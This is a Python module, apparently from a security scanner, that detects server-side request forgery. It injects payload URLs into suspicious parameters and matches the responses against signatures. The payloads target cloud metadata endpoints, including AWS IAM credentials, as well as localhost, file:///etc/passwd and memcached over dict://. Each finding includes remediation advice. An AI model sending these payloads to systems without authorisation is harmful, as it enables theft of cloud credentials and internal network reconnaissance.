"""Server-Side Request Forgery (SSRF) detection.

Strategi tanpa interaction-server:
- Kirim payload yang menyuruh server memuat URL internal/cloud-metadata,
  lalu cek apakah body response mengandung MARKER khas (mis. AMI ID,
  GCE metadata header, PHP info banner, default index pages).
- Heuristik tambahan: timing & status code yang khas (200 OK saat fetch
  127.0.0.1:80 padahal seharusnya gagal).
"""
from __future__ import annotations

import re
import time

from cyberloka.active._helpers import iter_param_urls
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

# Parameter yang sering jadi vektor SSRF
SSRF_PARAM_HINTS = (
    "url",
    "uri",
    "src",
    "source",
    "target",
    "dest",
    "destination",
    "callback",
    "feed",
    "rss",
    "redirect",
    "fetch",
    "load",
    "import",
    "page",
    "preview",
    "share",
    "image",
    "img",
    "host",
    "domain",
    "site",
    "proxy",
    "endpoint",
    "webhook",
    "next",
)

# Payload + signature pasangan
PAYLOADS: list[tuple[str, re.Pattern[str], str]] = [
    # AWS IMDS v1
    (
        "http://169.254.169.254/latest/meta-data/",
        re.compile(r"\b(ami-id|instance-id|iam/|hostname)\b", re.I),
        "AWS IMDS",
    ),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        re.compile(r"AccessKeyId|SecretAccessKey|Token", re.I),
        "AWS IMDS - IAM creds",
    ),
    # GCP metadata (butuh header, jadi sering hanya muncul pesan error khas)
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        re.compile(r"Metadata-Flavor|computeMetadata|project-id", re.I),
        "GCP metadata",
    ),
    # Azure
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        re.compile(r"\bcompute\b.*\bvmId\b|azEnvironment", re.I),
        "Azure IMDS",
    ),
    # Localhost markers
    (
        "http://127.0.0.1:80/",
        re.compile(r"<title>.*(apache|nginx|welcome|it works|test page).*</title>", re.I),
        "Localhost web",
    ),
    (
        "http://localhost/",
        re.compile(r"<title>.*(apache|nginx|welcome|it works|test page).*</title>", re.I),
        "Localhost web",
    ),
    # file:// (akan diblok di banyak stack tapi bila ada, tinggi)
    (
        "file:///etc/passwd",
        re.compile(r"root:[x*]:0:0:"),
        "file:// scheme reachable",
    ),
    # gopher / dict (banyak tools tidak memblok)
    (
        "dict://127.0.0.1:11211/stats",
        re.compile(r"STAT pid|memcached", re.I),
        "Memcached via dict://",
    ),
]


def _looks_useful(url: str, params: list[str] | None = None) -> list[str]:
    """Kembalikan list nama param yang potensial SSRF."""
    target_params = []
    if params:
        for p in params:
            if any(h in p.lower() for h in SSRF_PARAM_HINTS):
                target_params.append(p)
    return target_params


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)

    # Kandidat URL: base + endpoint dari crawler bila ada
    urls: list[str] = []
    if "?" in target.base_url:
        urls.append(target.base_url)
    discovered = getattr(target, "discovered", None)
    if discovered is not None:
        for ep in getattr(discovered, "endpoints", []):
            if ep.method != "GET":
                continue
            if "?" in ep.url and any(h in p.lower() for p in ep.params for h in SSRF_PARAM_HINTS):
                urls.append(ep.url)
            elif any(h in ep.url.lower() for h in ("?url=", "?u=", "?src=", "?dest=", "?next=", "?page=")):
                urls.append(ep.url)

    if not urls:
        return findings

    seen_param: set[str] = set()
    try:
        for url in urls[:20]:  # cap untuk keamanan
            for payload, signature, label in PAYLOADS:
                for param, mutated in iter_param_urls(url, payload):
                    # hanya uji parameter yang punya nama mencurigakan
                    if not any(h in param.lower() for h in SSRF_PARAM_HINTS):
                        continue
                    key = f"{param}|{label}"
                    if key in seen_param:
                        continue
                    seen_param.add(key)

                    t0 = time.monotonic()
                    resp = client.get(mutated)
                    elapsed = time.monotonic() - t0
                    if resp is None:
                        continue
                    body = resp.text or ""
                    if signature.search(body):
                        findings.append(
                            Finding(
                                module="ssrf",
                                title=f"SSRF terdeteksi pada `{param}` -> {label}",
                                severity=Severity.CRITICAL,
                                description=(
                                    "Server berhasil men-fetch URL yang dikontrol attacker dan "
                                    "mengembalikan konten dari sumber internal/metadata cloud. "
                                    "SSRF dapat dipakai untuk mencuri kredensial cloud, "
                                    "men-scan jaringan internal, atau pivoting."
                                ),
                                target=mutated,
                                evidence=f"payload={payload}\nelapsed={elapsed:.2f}s\nbody snippet:\n{truncate(body, 280)}",
                                cwe="CWE-918",
                                remediation=(
                                    "1) Whitelist host/skema yang diizinkan untuk fetch. "
                                    "2) Resolve hostname dulu, tolak jika IP private/loopback/link-local "
                                    "(termasuk 169.254.0.0/16). "
                                    "3) Disable redirect-following pada client internal. "
                                    "4) Untuk AWS, paksa IMDSv2 (token-required). "
                                    "5) Pisahkan jaringan service dari metadata endpoint."
                                ),
                                references=[
                                    "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                                ],
                            )
                        )
    finally:
        client.close()
    return findings
